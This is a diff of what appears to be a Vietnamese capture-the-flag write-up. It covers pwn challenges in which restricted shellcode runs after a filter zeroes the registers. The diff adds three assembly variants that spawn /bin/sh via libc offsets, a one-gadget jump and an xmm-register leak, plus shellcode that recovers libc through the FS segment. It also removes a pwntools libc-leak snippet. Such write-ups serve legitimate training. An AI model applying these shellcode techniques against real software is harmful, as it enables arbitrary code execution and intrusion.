@@ -278,34 +278,104 @@ if args.REMOTE:
 else:
     p = process(exe.path)
 GDB()
-
-ru(b'start with ')
-libc.address = int(r(10), 16) - libc.sym.puts
-info(f"Libc leak: {hex(libc.address)}")
-
-shell = asm('''
-    sub r13, 0x68
-    mov r13, [r13]
-    sub r13, 0x2182d0
-
-    mov r14, r13
-    add r14, 0x2646e
-
-    mov r8, 0x6969696500
-    mov r9, 29400045130965551
-    mov [r8], r9
-
-    mov rdi, r8
-    mov rax, 0x3b
-    jmp r14
-''', arch='amd64')
-
 ```
 
-### Cách 2
----
-## 
+### Cách 1: system binsh:
 
+```asm
+sub r13, 0x68
+mov r13, [r13]
+sub r13, 0x2182d0
+
+mov r14, r13
+add r14, 0x2646e
+
+mov r8, 0x6969696500
+mov r9, 29400045130965551
+mov [r8], r9
+
+mov rdi, r8
+mov rax, 0x3b
+jmp r14
+```
+
+### Cách 2: one gadget
+```asm
+  sub r13, 0x68
+  mov r13, [r13]
+  sub r13, 0x2182d0
+  mov r14, r13
+  add r14, 0xdabb3
+  mov rbp, 0x6969696500
+  mov rsp, 0x6969696500
+  push r14
+  mov rdi, 0
+  ret
+```
+
+### Cách 3: libc from xmm register
+```asm
+  movq r8, xmm1
+  sub r8, 0x1d9643
+  add r8, 0x2646e
+  mov rdi, 0x6969696500
+  mov r9, 29400045130965551
+  mov [rdi], r9
+  mov rax, 0x3b
+  jmp r8
+```
+
+---
+## the_absolute_horror_of_the_trip
+
+Vẫn như các chall trước, các filter đó, nhưng lần này các thanh ghi xmm bị xor hết về 0, và không có thanh ghi nào leak được thông tin
+
+```asm
+Dump of assembler code for function exec:
+   0x0000559f719a51df <+0>:     push   rbp
+   0x0000559f719a51e0 <+1>:     mov    rbp,rsp
+   0x0000559f719a51e3 <+4>:     mov    QWORD PTR [rbp-0x8],rdi
+   0x0000559f719a51e7 <+8>:     mov    rbx,0x0
+   0x0000559f719a51ee <+15>:    mov    rcx,0x0
+   0x0000559f719a51f5 <+22>:    mov    rdx,0x0
+   0x0000559f719a51fc <+29>:    mov    rsp,0x0
+   0x0000559f719a5203 <+36>:    mov    rbp,0x0
+   0x0000559f719a520a <+43>:    mov    r8,0x0
+   0x0000559f719a5211 <+50>:    mov    r9,0x0
+   0x0000559f719a5218 <+57>:    mov    r10,0x0
+   0x0000559f719a521f <+64>:    mov    r11,0x0
+   0x0000559f719a5226 <+71>:    mov    r12,0x0
+   0x0000559f719a522d <+78>:    mov    r13,0x0
+   0x0000559f719a5234 <+85>:    mov    r14,0x0
+   0x0000559f719a523b <+92>:    mov    r15,0x0
+   0x0000559f719a5242 <+99>:    pxor   xmm0,xmm0
+   0x0000559f719a5246 <+103>:   pxor   xmm1,xmm1
+   0x0000559f719a524a <+107>:   pxor   xmm2,xmm2
+   0x0000559f719a524e <+111>:   pxor   xmm3,xmm3
+   0x0000559f719a5252 <+115>:   pxor   xmm4,xmm4
+   0x0000559f719a5256 <+119>:   pxor   xmm5,xmm5
+   0x0000559f719a525a <+123>:   pxor   xmm6,xmm6
+   0x0000559f719a525e <+127>:   pxor   xmm7,xmm7
+=> 0x0000559f719a5262 <+131>:   jmp    rdi
+   0x0000559f719a5264 <+133>:   nop
+   0x0000559f719a5265 <+134>:   pop    rbp
+   0x0000559f719a5266 <+135>:   ret
+```
+Nhưng vẫn còn một nơi mà chương trình chưa clear, đó là `$FS`.
+
+![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252F7eyiduiPBWPuA3Nae8mS%252Fimage.png%3Falt%3Dmedia%26token%3D5d05343e-f94b-4a76-bba1-1495f5f36ae7&width=768&dpr=1&quality=100&sign=b0dbffbb94d7583551fbc9157b06af7b784f9784a1f97bac847cef94487f42fe)
+
+## shellcode:
+```asm
+  mov r8, [fs:0]
+  add r8, 0x28c0
+  add r8, 0x2646e
+  mov r10, 29400045130965551
+  mov rdi, 0x0000006969696000
+  mov [rdi], r10
+  mov rax, 0x3b
+  jmp r8
+```
 
 # Web
 
